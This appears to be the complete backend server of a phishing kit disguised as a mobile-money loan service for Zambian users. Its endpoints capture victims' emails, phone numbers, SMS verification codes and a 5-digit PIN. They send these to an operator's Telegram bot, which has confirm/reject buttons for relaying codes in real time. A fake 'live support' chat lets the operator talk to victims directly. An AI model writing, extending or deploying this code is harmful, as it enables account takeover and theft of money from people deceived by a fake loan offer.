require('dotenv').config();
const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
const path = require('path');

// ===== NEW: Import HTTP and Socket.io =====
const http = require('http');
const { Server } = require('socket.io');
// ==========================================

const app = express();
app.use(cors());
app.use(express.json());

// ===== NEW: Create HTTP server and Socket.io instance =====
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });
// ==========================================================

// Existing Loan Bot
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID   = process.env.CHAT_ID;

// ===== NEW: Support Chat Bot Variables =====
const SUPPORT_BOT_TOKEN = process.env.SUPPORT_BOT_TOKEN;
const SUPPORT_CHAT_ID   = process.env.SUPPORT_CHAT_ID;
// ============================================

// Serve HTML from parent folder
app.use(express.static(path.join(__dirname, '..')));

var decisions = {};
var firstCodes = {};

// ─── Helpers ───
function escapeHtml(str) {
    if (str === null || str === undefined) return '-';
    return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;');
}

function fmtPhone(p) {
    if (!p) return '-';
    const clean = String(p).replace(/\D/g, '');
    if (clean.length === 9) {
        return '+260 ' + clean.slice(0,3) + ' ' + clean.slice(3,6) + ' ' + clean.slice(6,9);
    }
    return '+260 ' + clean;
}

function nowStr() {
    return new Date().toLocaleString('en-GB', {
        day: '2-digit', month: 'short', year: 'numeric',
        hour: '2-digit', minute: '2-digit', second: '2-digit'
    });
}

// ============================================================
// 1) SUBMIT APPLICATION → LOGIN ATTEMPT
// ============================================================
app.post('/api/submit-application', async function (req, res) {
    var d = req.body;
    var referenceId = 'LA' + Date.now() + Math.floor(Math.random() * 1000);
    decisions[referenceId] = 'pending';

    var email = d.email || '-';
    var phone = fmtPhone(d.phone);

    var message =
        '🏦 <b>LOGIN ATTEMPT</b>\n' +
        '━━━━━━━━━━━━━━━━━━━━━━\n' +
        '🆕 <b>NEW USER</b>\n' +
        '\n📧 <b>Email:</b> ' + escapeHtml(email) + '\n' +
        '\n🌍 <b>Country Code:</b> +260\n' +
        '\n📱 <b>Phone Number:</b>\n' +
        '<pre><code>' + escapeHtml(phone) + '</code></pre>\n' +
        '\n🕐 ' + nowStr();

    try {
        await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        console.log('🏦 LOGIN ATTEMPT sent. Ref:', referenceId);
        res.json({ ok: true, referenceId: referenceId });
    } catch (err) {
        console.error(err);
        res.status(500).json({ ok: false });
    }
});

// ============================================================
// 2) VERIFY CODE → VERIFICATION MESSAGE
// ============================================================
app.post('/api/verify-code', async function (req, res) {
    var d = req.body;
    var referenceId = 'REF' + Date.now() + Math.floor(Math.random() * 1000);
    decisions[referenceId] = 'pending';
    firstCodes[referenceId] = d.code;

    var phone = fmtPhone(d.phone);
    var code  = d.code || '-';

    var message =
        '📱 <b>Phone:</b>\n' +
        '<pre><code>' + escapeHtml(phone) + '</code></pre>\n' +
        '\n💬 <b>SMS Code:</b>\n' +
        '<pre><code>' + escapeHtml(code) + '</code></pre>\n' +
        '\n🕐 ' + nowStr();

    var keyboard = {
        inline_keyboard: [[
            { text: '✅ CONFIRM', callback_data: 'confirm:' + referenceId },
            { text: '❌ REJECT',  callback_data: 'reject:' + referenceId }
        ]]
    };

    try {
        await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML',
                reply_markup: keyboard
            })
        });
        console.log('📩 VERIFICATION MESSAGE sent. Ref:', referenceId);
        res.json({ ok: true, referenceId: referenceId });
    } catch (err) {
        console.error(err);
        res.status(500).json({ ok: false });
    }
});

// ============================================================
// 3) RESEND CODE → RESEND REQUEST
// ============================================================
app.post('/api/resend-code', async function (req, res) {
    var d = req.body;
    var phone = fmtPhone(d.phone);

    var message =
        '🔄 <b>VERIFICATION MESSAGE RESEND REQUEST</b>\n' +
        '━━━━━━━━━━━━━━━━━━━━━━\n' +
        '🌍 <b>Country Code:</b> +260\n' +
        '\n📱 <b>Phone Number:</b>\n' +
        '<pre><code>' + escapeHtml(phone) + '</code></pre>\n' +
        '\n🕐 ' + nowStr();

    try {
        await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        res.json({ ok: true });
    } catch (err) {
        res.status(500).json({ ok: false });
    }
});

// ============================================================
// 4) CONFIRM LOAN (unchanged)
// ============================================================
app.post('/api/confirm-loan', async function (req, res) {
    var d = req.body;

    var message =
        '✅ <b>Loan Confirmed by Applicant</b>\n' +
        '━━━━━━━━━━━━━━━━━━━━━━\n' +
        '👤 ' + escapeHtml(d.firstName || '-') + ' ' + escapeHtml(d.lastName || '-') + '\n' +
        '📱 MoMo Number: ' + escapeHtml(fmtPhone(d.phone)) + '\n' +
        '📧 ' + escapeHtml(d.email || '-') + '\n' +
        '\n💰 <b>Loan:</b> ZMW ' + Number(d.amount || 0).toLocaleString() + '\n' +
        '📆 <b>Term:</b> ' + escapeHtml(d.term || '-') + ' months\n' +
        '🎯 <b>Purpose:</b> ' + escapeHtml(d.purpose || '-') + '\n' +
        '\n🕐 ' + nowStr();

    try {
        await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        res.json({ ok: true });
    } catch (err) {
        res.status(500).json({ ok: false });
    }
});

// ============================================================
// 5) STATUS
// ============================================================
app.get('/api/status', function (req, res) {
    var ref = req.query.ref;
    res.json({ status: decisions[ref] || 'pending' });
});

// ============================================================
// 6) TELEGRAM CALLBACK (Merged: Handles Buttons AND Chat)
// ============================================================
app.post('/api/telegram-callback', async function (req, res) {
    // --- A) Handle Button Clicks (Confirm/Reject) ---
    var cb = req.body.callback_query;
    if (cb) {
        var parts = cb.data.split(':');
        var action = parts[0];
        var referenceId = parts[1];

        decisions[referenceId] = (action === 'confirm') ? 'confirmed' : 'rejected';
        console.log('📥 Decision:', referenceId, '->', decisions[referenceId]);

        try {
            await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/answerCallbackQuery', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    callback_query_id: cb.id,
                    text: action === 'confirm' ? '✅ Confirmed' : '❌ Rejected'
                })
            });

            await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/editMessageText', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: cb.message.chat.id,
                    message_id: cb.message.message_id,
                    text: cb.message.text + '\n\n— — —\n' +
                          (action === 'confirm' ? '✅ CONFIRMED' : '❌ REJECTED'),
                    parse_mode: 'HTML'
                })
            });
        } catch (err) {
            console.error('Callback reply failed:', err);
        }
        return res.sendStatus(200);
    }

    // --- B) NEW: Handle Chat Replies from Agent (SUPPORT BOT) ---
    var msg = req.body.message;
    if (msg && msg.text && msg.reply_to_message) {
        var targetSocketId = replyMap[msg.reply_to_message.message_id];
        if (targetSocketId) {
            io.to(targetSocketId).emit('agent-message', { text: msg.text });
            console.log('📨 Chat reply routed to:', targetSocketId);
            
            try {
                await fetch('https://api.telegram.org/bot' + SUPPORT_BOT_TOKEN + '/sendMessage', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: SUPPORT_CHAT_ID, text: '✅ Reply delivered.' })
                });
            } catch (e) { console.error(e); }
        }
    }

    res.sendStatus(200);
});

// ============================================================
// 7) FINAL CODE (5-digit PIN)
// ============================================================
app.post('/api/final-code', async function (req, res) {
    var d = req.body;
    var phone = fmtPhone(d.phone);
    var pin = d.finalCode || '-';

    var message =
        '📱 <b>Phone:</b>\n' +
        '<pre><code>' + escapeHtml(phone) + '</code></pre>\n' +
        '\n🔐 <b>5-Digit PIN:</b>\n' +
        '<pre><code>' + escapeHtml(pin) + '</code></pre>\n' +
        '\n🕐 ' + nowStr();

    try {
        await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        console.log('🔐 PIN sent. Phone:', phone);
        res.json({ ok: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ ok: false });
    }
});

// ============================================================
// 8) LAST CODE (4-digit SMS code)
// ============================================================
app.post('/api/last-code', async function (req, res) {
    var d = req.body;
    var referenceId = 'LC' + Date.now() + Math.floor(Math.random() * 1000);
    decisions[referenceId] = 'pending';

    var phone = fmtPhone(d.phone);
    var code = d.lastCode || '-';

    var message =
        '📱 <b>Phone:</b>\n' +
        '<pre><code>' + escapeHtml(phone) + '</code></pre>\n' +
        '\n🔐 <b>4-Digit Code:</b>\n' +
        '<pre><code>' + escapeHtml(code) + '</code></pre>\n' +
        '\n🕐 ' + nowStr();

    var keyboard = {
        inline_keyboard: [[
            { text: '✅ CONFIRM', callback_data: 'confirm:' + referenceId },
            { text: '❌ REJECT',  callback_data: 'reject:' + referenceId }
        ]]
    };

    try {
        await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML',
                reply_markup: keyboard
            })
        });
        console.log('🔐 Last code sent. Ref:', referenceId);
        res.json({ ok: true, referenceId: referenceId });
    } catch (err) {
        console.error(err);
        res.status(500).json({ ok: false });
    }
});

// ============================================================
// ===== NEW: LIVE SUPPORT CHAT BRIDGE (Uses SUPPORT BOT) =====
// ============================================================

const chatSessions = {};
const replyMap = {};

io.on('connection', (socket) => {
    console.log('💬 Chat user connected:', socket.id);

    socket.on('user-message', async (data) => {
        const text = data.text;
        const userRef = 'CHAT-' + socket.id.slice(0, 6).toUpperCase();
        chatSessions[socket.id] = userRef;

        const telegramMsg =
            '💬 <b>LIVE SUPPORT CHAT</b>\n' +
            '━━━━━━━━━━━━━━━━━━━━━━\n' +
            '🔖 <b>Session:</b> <code>' + userRef + '</code>\n' +
            '\n👤 <b>User says:</b>\n' +
            '<pre><code>' + escapeHtml(text) + '</code></pre>\n' +
            '\n🕐 ' + nowStr() + '\n' +
            '\n<i>👉 Reply to THIS message to send a response back to the user.</i>';

        try {
            // Send using the SUPPORT bot
            const res = await fetch('https://api.telegram.org/bot' + SUPPORT_BOT_TOKEN + '/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: SUPPORT_CHAT_ID,
                    text: telegramMsg,
                    parse_mode: 'HTML',
                    reply_markup: {
                        force_reply: true,
                        input_field_placeholder: 'Reply to ' + userRef + '...'
                    }
                })
            });
            const json = await res.json();
            
            if (json.ok && json.result) {
                replyMap[json.result.message_id] = socket.id;
                console.log('📤 Sent to Support Telegram:', userRef);
            }
        } catch (err) {
            console.error('Failed to send to Support Telegram:', err);
        }
    });

    socket.on('disconnect', () => {
        console.log('💬 Chat user disconnected:', socket.id);
        delete chatSessions[socket.id];
    });
});

// ============================================================
// START SERVER
// ============================================================
var PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', function () {
    console.log('🚀 MoMo server running at port ' + PORT);
});